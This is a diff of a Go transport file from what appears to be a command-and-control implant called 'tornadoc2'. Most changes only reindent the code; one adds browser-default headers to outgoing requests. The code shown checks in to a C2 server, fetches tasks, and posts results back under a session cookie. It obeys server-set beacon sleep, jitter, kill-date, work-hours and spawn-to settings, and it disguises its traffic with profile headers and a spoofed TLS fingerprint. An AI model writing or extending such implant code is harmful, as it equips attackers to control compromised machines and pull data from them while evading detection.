@@ -1,27 +1,27 @@
 package transport
 
 import (
-    "bytes"
-    "crypto/tls"
-    "encoding/json"
-    "errors"
-    "fmt"
-    "io"
-    "net/http"
-    "strconv"
-    "strings"
+	"bytes"
+	"crypto/tls"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"io"
+	"net/http"
+	"strconv"
+	"strings"
 
-    "tornadoc2/agent/features"
-    "tornadoc2/agent/internal/tlsfp"
-    "tornadoc2/agent/protocol"
+	"tornadoc2/agent/features"
+	"tornadoc2/agent/internal/tlsfp"
+	"tornadoc2/agent/protocol"
 )
 
 type httpTransport struct {
-    baseURL string
-    profile Profile
-    client  *http.Client
-    cookie  string
-    shaping *ShapingSpec
+	baseURL string
+	profile Profile
+	client  *http.Client
+	cookie  string
+	shaping *ShapingSpec
 }
 
 func NewHTTPTransport(url string, profile Profile,
@@ -45,14 +45,15 @@ func NewHTTPTransport(url string, profile Profile,
 func (t *httpTransport) Name() string { return "http" }
 
 func (t *httpTransport) applyHeaders(req *http.Request) {
-    req.Header.Set("Content-Type", "application/json")
-    for k, v := range t.profile.RequestHeaders {
-        req.Header.Set(k, v)
-    }
-    for k, v := range t.profile.ExtraHeaders {
-        req.Header.Set(k, v)
-    }
-    req.Header.Set("User-Agent", t.profile.UserAgent)
+	req.Header.Set("Content-Type", "application/json")
+	for k, v := range t.profile.RequestHeaders {
+		req.Header.Set(k, v)
+	}
+	for k, v := range t.profile.ExtraHeaders {
+		req.Header.Set(k, v)
+	}
+	req.Header.Set("User-Agent", t.profile.UserAgent)
+	applyBrowserDefaults(req)
 }
 
 func (t *httpTransport) CheckIn(identity Identity,
@@ -179,35 +180,35 @@ func (t *httpTransport) FetchTasks(wire *WireSession) ([]Task, error) {
 			resp.StatusCode, wantTasks)
 	}
 
-    // Scheduling headers. Applied by the caller.
-    if v := resp.Header.Get("X-Beacon-Sleep"); v != "" {
-        if n, err := strconv.Atoi(v); err == nil && n >= 0 {
-            protocol.ScheduleSleep = n
-        }
-    }
-    if v := resp.Header.Get("X-Beacon-Jitter"); v != "" {
-        if f, err := strconv.ParseFloat(v, 64); err == nil {
-            protocol.ScheduleJitter = f
-        }
-    }
-    if v := resp.Header.Get("X-Beacon-Kill"); v != "" {
-        if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
-            protocol.ScheduleKill = n
-        }
-    }
-    if v := resp.Header.Get("X-Beacon-WorkStart"); v != "" {
-        if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
-            protocol.WorkHoursStart = n
-        }
-    }
-    if v := resp.Header.Get("X-Beacon-WorkEnd"); v != "" {
-        if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
-            protocol.WorkHoursEnd = n
-        }
-    }
-    if v := resp.Header.Get("X-Beacon-SpawnTo"); v != "" {
-        protocol.ScheduleSpawnTo = v
-    }
+	// Scheduling headers. Applied by the caller.
+	if v := resp.Header.Get("X-Beacon-Sleep"); v != "" {
+		if n, err := strconv.Atoi(v); err == nil && n >= 0 {
+			protocol.ScheduleSleep = n
+		}
+	}
+	if v := resp.Header.Get("X-Beacon-Jitter"); v != "" {
+		if f, err := strconv.ParseFloat(v, 64); err == nil {
+			protocol.ScheduleJitter = f
+		}
+	}
+	if v := resp.Header.Get("X-Beacon-Kill"); v != "" {
+		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
+			protocol.ScheduleKill = n
+		}
+	}
+	if v := resp.Header.Get("X-Beacon-WorkStart"); v != "" {
+		if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
+			protocol.WorkHoursStart = n
+		}
+	}
+	if v := resp.Header.Get("X-Beacon-WorkEnd"); v != "" {
+		if n, err := strconv.Atoi(v); err == nil && n >= 0 && n < 1440 {
+			protocol.WorkHoursEnd = n
+		}
+	}
+	if v := resp.Header.Get("X-Beacon-SpawnTo"); v != "" {
+		protocol.ScheduleSpawnTo = v
+	}
 
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
@@ -267,33 +268,33 @@ func (t *httpTransport) PostResult(r Result, wire *WireSession) error {
 	if err != nil {
 		return fmt.Errorf("results: build request: %w", err)
 	}
-    cookieName := t.profile.CookieName
-    if cookieName == "" {
-        cookieName = "sid"
-    }
-    req.Header.Set("Cookie", cookieName+"="+t.cookie)
-    req.Header.Set("Content-Type", "application/json")
-    t.applyHeaders(req)
+	cookieName := t.profile.CookieName
+	if cookieName == "" {
+		cookieName = "sid"
+	}
+	req.Header.Set("Cookie", cookieName+"="+t.cookie)
+	req.Header.Set("Content-Type", "application/json")
+	t.applyHeaders(req)
 
-    resp, err := t.client.Do(req)
-    if err != nil {
-        return err
-    }
-    resp.Body.Close()
-    wantResults := 204
-    if t.profile.Status != nil && t.profile.Status.Results > 0 {
-        wantResults = t.profile.Status.Results
-    }
-    if resp.StatusCode != wantResults {
-        return fmt.Errorf("results status %d (wanted %d)",
-            resp.StatusCode, wantResults)
-    }
-    return nil
+	resp, err := t.client.Do(req)
+	if err != nil {
+		return err
+	}
+	resp.Body.Close()
+	wantResults := 204
+	if t.profile.Status != nil && t.profile.Status.Results > 0 {
+		wantResults = t.profile.Status.Results
+	}
+	if resp.StatusCode != wantResults {
+		return fmt.Errorf("results status %d (wanted %d)",
+			resp.StatusCode, wantResults)
+	}
+	return nil
 }
 
 func (t *httpTransport) Close() error {
-    t.client.CloseIdleConnections()
-    return nil
+	t.client.CloseIdleConnections()
+	return nil
 }
 
 func extractEnvelope(resp *http.Response,
